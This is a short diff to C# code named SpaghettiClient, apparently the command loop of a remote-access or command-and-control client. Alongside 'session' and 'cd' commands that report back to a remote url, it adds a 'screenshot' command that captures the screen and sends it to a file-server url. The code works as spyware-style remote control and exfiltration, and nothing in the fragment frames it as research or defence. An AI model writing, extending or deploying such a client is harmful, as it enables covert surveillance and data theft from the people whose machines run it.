@@ -41,7 +41,11 @@ namespace SpaghettiClient
                 }
                 else if (cmd.ToLower() == "session")
                 {
-                    Utilities.Post(url, "!#!"+sessionid);
+                    Utilities.Post(url, "!#!" + sessionid);
+                }
+                else if (cmd.ToLower() == "screenshot")
+                {
+                    commands.Screenshot(fs_url, url, sessionid, location);
                 }
                 else if (cmd.ToLower().StartsWith("cd ")) 
                 {
